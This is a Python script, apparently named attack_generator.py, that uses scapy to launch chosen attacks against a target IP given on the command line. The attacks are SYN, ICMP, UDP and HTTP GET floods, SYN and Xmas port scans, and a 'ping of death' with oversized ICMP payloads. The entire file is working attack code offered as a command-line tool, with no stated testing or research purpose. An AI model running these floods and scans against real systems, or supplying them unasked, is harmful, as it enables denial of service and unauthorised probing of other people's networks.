import sys
import time
from scapy.all import *

def syn_flood(target_ip, target_port, count=100):
    print(f"Starting SYN flood: {target_ip}:{target_port}, count={count}")
    for i in range(count):
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        send(ip/tcp, verbose=0)
        time.sleep(0.01)
    print("SYN flood completed.")

def icmp_flood(target_ip, count=100):
    print(f"Starting ICMP flood: {target_ip}, count={count}")
    for i in range(count):
        pkt = IP(dst=target_ip)/ICMP()
        send(pkt, verbose=0)
        time.sleep(0.01)
    print("ICMP flood completed.")

def port_scan(target_ip, ports):
    print(f"Starting port scan: {target_ip}, ports={ports}")
    for port in ports:
        pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
        send(pkt, verbose=0)
        time.sleep(0.01)
    print("Port scan completed.")

def udp_flood(target_ip, target_port, count=100):
    print(f"Starting UDP flood: {target_ip}:{target_port}, count={count}")
    for i in range(count):
        pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=os.urandom(32))
        send(pkt, verbose=0)
        time.sleep(0.01)
    print("UDP flood completed.")

def http_get_flood(target_ip, target_port=80, count=100):
    print(f"Starting HTTP GET flood: {target_ip}:{target_port}, count={count}")
    for i in range(count):
        pkt = IP(dst=target_ip)/TCP(dport=target_port, sport=RandShort(), flags="PA")/Raw(load="GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip))
        send(pkt, verbose=0)
        time.sleep(0.01)
    print("HTTP GET flood completed.")

def xmas_scan(target_ip, ports):
    print(f"Starting Xmas scan: {target_ip}, ports={ports}")
    for port in ports:
        pkt = IP(dst=target_ip)/TCP(dport=port, flags="FPU")
        send(pkt, verbose=0)
        time.sleep(0.01)
    print("Xmas scan completed.")

def ping_of_death(target_ip, count=10):
    print(f"Starting Ping of Death: {target_ip}, count={count}")
    for i in range(count):
        pkt = IP(dst=target_ip)/ICMP()/Raw(load="X"*60000)
        send(pkt, verbose=0)
        time.sleep(0.1)
    print("Ping of Death completed.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python attack_generator.py <attack_type> <target_ip> [options]")
        print("attack_type: syn_flood, icmp_flood, port_scan, udp_flood, http_get_flood, xmas_scan, ping_of_death")
        sys.exit(1)
    attack_type = sys.argv[1]
    target_ip = sys.argv[2]
    if attack_type == "syn_flood":
        target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
        count = int(sys.argv[4]) if len(sys.argv) > 4 else 100
        syn_flood(target_ip, target_port, count)
    elif attack_type == "icmp_flood":
        count = int(sys.argv[3]) if len(sys.argv) > 3 else 100
        icmp_flood(target_ip, count)
    elif attack_type == "port_scan":
        ports = list(map(int, sys.argv[3:])) if len(sys.argv) > 3 else list(range(20, 1024))
        port_scan(target_ip, ports)
    elif attack_type == "udp_flood":
        target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 53
        count = int(sys.argv[4]) if len(sys.argv) > 4 else 100
        udp_flood(target_ip, target_port, count)
    elif attack_type == "http_get_flood":
        target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
        count = int(sys.argv[4]) if len(sys.argv) > 4 else 100
        http_get_flood(target_ip, target_port, count)
    elif attack_type == "xmas_scan":
        ports = list(map(int, sys.argv[3:])) if len(sys.argv) > 3 else list(range(20, 1024))
        xmas_scan(target_ip, ports)
    elif attack_type == "ping_of_death":
        count = int(sys.argv[3]) if len(sys.argv) > 3 else 10
        ping_of_death(target_ip, count)
    else:
        print("Unknown attack type.")
